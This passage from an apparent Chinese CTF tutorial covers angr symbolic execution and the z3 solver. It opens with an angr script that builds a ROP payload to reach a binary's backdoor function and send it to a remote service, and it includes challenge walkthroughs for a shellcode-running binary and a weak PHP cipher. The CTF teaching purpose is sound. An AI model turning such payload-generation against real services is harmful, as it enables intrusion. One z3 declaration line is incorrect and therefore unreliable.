buf, <span class="built_in">len</span></span>):</span><br><span class="line">        <span class="built_in">len</span> = self.state.solver.<span class="built_in">eval</span>(<span class="built_in">len</span>)</span><br><span class="line">        self.state.memory.store(buf, getBVV(self.state, <span class="built_in">len</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementInputVal</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        self.state.regs.rax = getBVV(self.state, <span class="number">4</span>, <span class="string">&#x27;int&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementInit</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">p.hook_symbol(<span class="string">&quot;_Z5fksthPKcS0_&quot;</span>, ReplacementCheckEquals())</span><br><span class="line">p.hook_symbol(<span class="string">&quot;_Z10input_linePcm&quot;</span>, ReplacementCheckInput())</span><br><span class="line">p.hook_symbol(<span class="string">&quot;_Z9input_valv&quot;</span>, ReplacementInputVal())</span><br><span class="line">p.hook_symbol(<span class="string">&quot;_Z4initv&quot;</span>, ReplacementInit())</span><br><span class="line">enter = p.factory.entry_state()</span><br><span class="line">enter.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>] = <span class="number">0</span></span><br><span class="line">simgr = p.factory.simgr(enter, save_unconstrained=<span class="literal">True</span>)</span><br><span class="line">d = simgr.explore()</span><br><span class="line">backdoor = p.loader.find_symbol(<span class="string">&#x27;_Z8backdoorv&#x27;</span>).rebased_addr</span><br><span class="line"><span class="keyword">for</span> state <span class="keyword">in</span> d.unconstrained:</span><br><span class="line">    bindata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rsp = state.regs.rsp</span><br><span class="line">    next_stack = state.memory.load(rsp, <span class="number">8</span>, endness=p.arch.memory_endness)</span><br><span class="line">    state.add_constraints(state.regs.rip == ret_rop)</span><br><span class="line">    state.add_constraints(next_stack == backdoor)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>]):</span><br><span class="line">        s, s_type = state.<span class="built_in">globals</span>[<span class="string">&#x27;s_&#x27;</span> + <span class="built_in">str</span>(i)]</span><br><span class="line">        <span class="keyword">if</span> s_type == <span class="string">&#x27;str&#x27;</span>:</span><br><span class="line">            bb = state.solver.<span class="built_in">eval</span>(s, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">            <span class="keyword">if</span> bb.count(<span class="string">b&#x27;\x00&#x27;</span>) == <span class="built_in">len</span>(bb):</span><br><span class="line">                bb = <span class="string">b&#x27;A&#x27;</span> * bb.count(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            bindata += bb</span><br><span class="line">        <span class="keyword">elif</span> s_type == <span class="string">&#x27;int&#x27;</span>:</span><br><span class="line">            bindata += <span class="built_in">str</span>(state.solver.<span class="built_in">eval</span>(s, cast_to=<span class="built_in">int</span>)).encode(<span class="string">&#x27;ASCII&#x27;</span>) + <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(bindata)</span><br><span class="line">    r.send(bindata)</span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>首先是一些预操作,接着是对四个函数进行hook,防止路径爆炸或其他?</p>
<p>获得unconstrained,然后这个乍一看怪怪的</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>]):</span><br><span class="line">    s, s_type = state.<span class="built_in">globals</span>[<span class="string">&#x27;s_&#x27;</span> + <span class="built_in">str</span>(i)]</span><br></pre></td></tr></table></figure>
<p>这里了解一个知识</p>
<p><strong><code>state.globals.__dict__</code></strong>是一个字典,里面又有一个字典<code>_backer</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.unconstrained[<span class="number">0</span>].<span class="built_in">globals</span>.__dict__</span><br><span class="line">&#123;<span class="string">&#x27;state&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;_backer&#x27;</span>: &#123;<span class="string">&#x27;symbols_count&#x27;</span>: <span class="number">17</span>, <span class="string">&#x27;s_0&#x27;</span>: (&lt;BV32 s_0_51_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_1&#x27;</span>: (&lt;BV32 s_1_52_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_2&#x27;</span>: (&lt;BV32 s_2_53_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_3&#x27;</span>: (&lt;BV32 s_3_54_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_4&#x27;</span>: (&lt;BV32 s_4_56_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_5&#x27;</span>: (&lt;BV32 s_5_57_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_6&#x27;</span>: (&lt;BV32 s_6_58_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_7&#x27;</span>: (&lt;BV32 s_7_59_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_8&#x27;</span>: (&lt;BV392 s_8_64_392&gt;, <span class="string">&#x27;str&#x27;</span>), <span class="string">&#x27;s_9&#x27;</span>: (&lt;BV32 s_9_74_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_10&#x27;</span>: (&lt;BV32 s_10_80_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_11&#x27;</span>: (&lt;BV32 s_11_85_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_12&#x27;</span>: (&lt;BV32 s_12_92_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_13&#x27;</span>: (&lt;BV248 s_13_116_248&gt;, <span class="string">&#x27;str&#x27;</span>), <span class="string">&#x27;s_14&#x27;</span>: (&lt;BV296 s_14_160_296&gt;, <span class="string">&#x27;str&#x27;</span>), <span class="string">&#x27;s_15&#x27;</span>: (&lt;BV448 s_15_230_448&gt;, <span class="string">&#x27;str&#x27;</span>), <span class="string">&#x27;s_16&#x27;</span>: (&lt;BV464 s_16_379_464&gt;, <span class="string">&#x27;str&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>里面有着<code>symbols_count</code>对应着全部的键值对数量</p>
<p>以及这样的键值对<code>s_num:(var,type)</code>,代表的是<u>从初始状态到该状态</u>所有出现的符号,<u>num代表的是出现的顺序</u></p>
<p>那么wp就明朗了没啥好说的,将符号转为字节串payload就是了</p>
<h1 id="约束求解"><a href="#约束求解" class="headerlink" title="约束求解"></a>约束求解</h1><p>约束求解用于解决一组条件的问题，这些条件通常被称为约束，其目的是找到满足这些约束的变量值。</p>
<p>在程序分析中，约束求解通常与符号执行相结合使用。符号执行是一种用符号变量代替具体值的执行技术，它可以在不实际执行程序的情况下探索程序路径，并生成关于程序行为的约束。约束求解器则负责解决这些约束，以确定符号变量可能的取值，从而确定程序执行的路径或找到输入数据的有效值。</p>
<p>约束求解在以下情况下特别有用：</p>
<ol>
<li><strong>程序分析</strong>：通过符号执行和约束求解，可以发现程序中的漏洞、逻辑错误或安全问题。</li>
<li><strong>自动化测试</strong>：使用符号执行和约束求解来生成输入数据，以覆盖代码中的不同执行路径，从而进行自动化测试。</li>
<li><strong>逆向工程</strong>：在逆向工程中，约束求解可以帮助分析者理解程序的行为，并识别关键的代码路径。</li>
<li><strong>二进制分析</strong>：在分析二进制文件时，约束求解可以帮助分析者理解程序逻辑，并发现关键功能。</li>
</ol>
<p>约束求解器的实现通常涉及各种技术和算法，包括基于SAT（可满足性问题）的方法、基于SMT（可满足性模理论）的方法以及其他启发式和优化算法。</p>
<p>下面介绍一下微软开发的z3约束求解器</p>
<h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>z3是一个十分强大的约束求解器,支持众多功能</p>
<h3 id="类型变量"><a href="#类型变量" class="headerlink" title="类型变量"></a>类型变量</h3><p>z3中有3中类型的变量，分别是整型(Int),实型(Real)和向量(BitVec)</p>
<p>Int-整数型</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#声明单个整型变量</span></span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)<span class="comment">#声明多个整型变量</span></span><br></pre></td></tr></table></figure>
<p>Real-实数型</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = Real(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#声明单个实型变量</span></span><br><span class="line">a,b = Reals(<span class="string">&#x27;a b&#x27;</span>)<span class="comment">#声明多个实型变量</span></span><br></pre></td></tr></table></figure>
<p>BitVec-向量</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>,<span class="number">8</span>) <span class="comment">#声明单个8位的变量</span></span><br><span class="line">a, b = BitVec(<span class="string">&#x27;a b&#x27;</span>,<span class="number">8</span>)<span class="comment">#声明多个8位的变量</span></span><br></pre></td></tr></table></figure>
<h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p><strong>0x1简单约束求解</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>solve(a&gt;<span class="number">6</span>,b&lt;<span class="number">10</span>,a*b-<span class="number">1</span>==<span class="number">48</span>)</span><br><span class="line">[a = <span class="number">49</span>, b = <span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p><strong>0x2多条件条件约束器</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line">solver = Solver()<span class="comment">#创建一个求解器对象</span></span><br><span class="line">solver.add(a+b==<span class="number">10</span>)<span class="comment">#用add方法添加约束条件</span></span><br><span class="line">solver.add(a-b==<span class="number">6</span>)</span><br><span class="line"><span class="keyword">if</span> solver.check() == sat: <span class="comment">#check()方法用来判断是否有解，sat(satisify)表示满足有解</span></span><br><span class="line">    ans = solver.model() <span class="comment">#model()方法得到解</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    <span class="comment">#也可以用变量名作为下标得到解</span></span><br><span class="line">    <span class="built_in">print</span>(ans[a])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no ans!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>0x3表达式简化</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x=Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (simplify(x + y + <span class="number">2</span>*x + <span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span> (simplify(x &lt; y + x + <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span> (simplify(And(x + <span class="number">1</span> &gt;= <span class="number">3</span>, x**<span class="number">2</span> + x**<span class="number">2</span> + y**<span class="number">2</span> + <span class="number">2</span> &gt;= <span class="number">5</span>)))</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> + <span class="number">3</span>*x + y</span><br><span class="line">Not(y &lt;= -<span class="number">2</span>)</span><br><span class="line">And(x &gt;= <span class="number">2</span>, <span class="number">2</span>*x**<span class="number">2</span> + y**<span class="number">2</span> &gt;= <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p><strong>0x4表达式分析</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">n = x + y &gt;= <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;num args: &quot;</span>, n.num_args())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;children: &quot;</span>, n.children())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;1st child:&quot;</span>, n.arg(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;2nd child:&quot;</span>, n.arg(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;operator: &quot;</span>, n.decl())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;op name:  &quot;</span>, n.decl().name())</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">num args:  <span class="number">2</span></span><br><span class="line">children:  [x + y, <span class="number">3</span>]</span><br><span class="line">1st child: x + y</span><br><span class="line">2nd child: <span class="number">3</span></span><br><span class="line">operator:  &gt;=</span><br><span class="line">op name:   &gt;=</span><br></pre></td></tr></table></figure>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>z3只适用于求解非线性多项式</p>
<p>像这样的就无法求解</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Solver()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">2</span>**x == <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (s.check())</span><br><span class="line">unknown</span><br></pre></td></tr></table></figure>
<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><h3 id="2020De1ta-code-runner"><a href="#2020De1ta-code-runner" class="headerlink" title="2020De1ta-code_runner"></a>2020De1ta-code_runner</h3><p>这题一开始有一个sha256爆破,之后才能拿到二进制文件,这里直接从二进制文件分析开始</p>
<p>这是个mipsel架构的文件</p>
<p>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// $a0 OVERLAPPED</span></span><br><span class="line">  __int64 v4; <span class="comment">// $a2 OVERLAPPED</span></span><br><span class="line">  __int64 v6; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">v7</span>;</span> <span class="comment">// [sp+3Ch] [+3Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">v8</span>;</span> <span class="comment">// [sp+44h] [+44h] BYREF</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v9[<span class="number">64</span>])(_DWORD, _DWORD, _DWORD, _DWORD); <span class="comment">// [sp+4Ch] [+4Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  gettimeofday(&amp;v7, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  sub_401BA4();</span><br><span class="line">  <span class="keyword">if</span> ( sub_401C6C() )</span><br><span class="line">  &#123;</span><br><span class="line">    gettimeofday(&amp;v8, <span class="number">0</span>);</span><br><span class="line">    v6 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">1000000</span> * (v8.tv_sec - v7.tv_sec) + v8.tv_usec - v7.tv_usec);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;======== %lld.%llds ========\n&quot;</span>, v6 / <span class="number">1000000</span>, v6 % <span class="number">1000000</span>);</span><br><span class="line">    sub_401D48(v6, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your time comes.\n&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v6 / <span class="number">100000</span>) &lt; <span class="number">0xD</span> )</span><br><span class="line">      read(<span class="number">0</span>, v9, <span class="number">-4</span> * (v6 / <span class="number">100000</span>) + <span class="number">52</span>);</span><br><span class="line">    v9[<span class="number">0</span>](v3, HIDWORD(v3), v4, HIDWORD(v4));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在最后可以执行shellcode,观察到前面的时间计算,显然是限制需要在一定时间内完成某些挑战</p>
<p>在sub_401C6C()函数里有一大坨套娃函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401C6C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">256</span>]; <span class="comment">// [sp+1Ch] [+1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Faster &gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">return</span> sub_401A9C((<span class="type">int</span>)v1);</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400B30</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3221338814</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终需要满足各种条件到达sub_400B30()</p>
<p>序会先读取0x100的输入，然后对这个输入做一系列的验证，只有通过所有验证函数才可以返回一个非零值。这些验证函数，每一个函数处理4字节的输入，然后如果此4字节通过验证，会调用另一个函数再去处理接下来的4字节；如果此4字节没有通过验证，则直接返回0。这种模式我们称之为线性，也就是说一旦有4字节的输入不正确，接下来的所有输入都不会被验证。</p>
<p>线性模式的解题利器就是angr,一段不做任何优化处理的脚本可以是</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = angr.Project(<span class="string">&quot;real_code&quot;</span>)</span><br><span class="line">state = p.factory.blank_state(addr=<span class="number">0x401e88</span>)</span><br><span class="line">sm = p.factory.simgr(state)</span><br><span class="line">sm.explore(find=<span class="number">0x400b30</span>)</span><br><span class="line"><span class="comment"># 0x400b30为最内层return非零值的汇编指令</span></span><br><span class="line"><span class="built_in">print</span>(sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>之后好像有点复杂,先摸了</p>
<h3 id="DEFCAMP2017-forgot-my-key"><a href="#DEFCAMP2017-forgot-my-key" class="headerlink" title="DEFCAMP2017-forgot_my_key"></a>DEFCAMP2017-forgot_my_key</h3><p>给了这么一个加密函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"><span class="variable">$flag</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">  <span class="variable">$message</span> = <span class="variable">$flag</span> . <span class="string">&quot;|&quot;</span> . <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$encrypted</span> = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">126</span>));</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$message</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$encrypted</span> .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$message</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$key</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$encrypted</span>[<span class="variable">$i</span>])) % <span class="number">126</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$hexstr</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;h*&#x27;</span>, <span class="variable">$encrypted</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">array_shift</span>(<span class="variable">$hexstr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加密串每一位都与明文、key、和加密串的前一位相关。但是由于第一位是随机出来的，所以很难从开头递推出来。</p>
<p>但是细心观察 message 的构成又可以发现，后面 32 位是 key 的 md5 串，倒数第 33 位又是已知，因此从这里就可以打开突破口。整理思路如下：</p>
<ul>
<li>第一步：通过倒数第 33 位明文已知，且密文已知，因此可以求得某一位 md5($key) 的值。</li>
<li>第二步：根据上一步推出来的值，又可以进一步推另一位 message 的值。如此往复下去，最终应该能找到所有的值。</li>
</ul>
<p>首先题目肯定保证了答案的唯一性，因此 Z3 求解成功就会得到 flag 无疑</p>
<p>其次，我们根据题目的变换方式，给 Z3 所有的正推关系式，把逆推的逻辑让 Z3 通过约束求解来完成，由于逆推可以一步步进行，因此也不会导致 Z3 复杂度爆炸求解不出来</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&#x27;</span></span><br><span class="line"></span><br><span class="line">encrypted = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    encrypted.append(binascii.unhexlify(s[i+<span class="number">1</span>] + s[i])[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;message len:&#x27;</span>, <span class="built_in">len</span>(encrypted)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(encrypted)</span><br><span class="line"><span class="comment"># 声明变量，encrypted 是已知，因此 IntVal 即可</span></span><br><span class="line">encrypted = [IntVal(i) <span class="keyword">for</span> i <span class="keyword">in</span> encrypted]</span><br><span class="line">message = [Int(<span class="string">&#x27;flag%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)-<span class="number">1</span>)]</span><br><span class="line"><span class="comment"># 创建一个求解器，求解全靠它</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">ml = <span class="built_in">len</span>(encrypted) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加明文字符的约束条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">    <span class="keyword">if</span> i == ml - <span class="number">33</span>:</span><br><span class="line">        solver.add(message[i] == <span class="built_in">ord</span>(<span class="string">&#x27;|&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 肯定是可见字符，因此限定范围如下</span></span><br><span class="line">        solver.add(message[i] &lt; <span class="number">127</span>)</span><br><span class="line">        solver.add(message[i] &gt;= <span class="number">32</span>)</span><br><span class="line"><span class="comment"># 添加明文和密文对照关系的约束条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">    solver.add(encrypted[i+<span class="number">1</span>] == (message[i] + message[ml-<span class="number">32</span>+i%<span class="number">32</span>] + encrypted[i]) % <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    s = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span 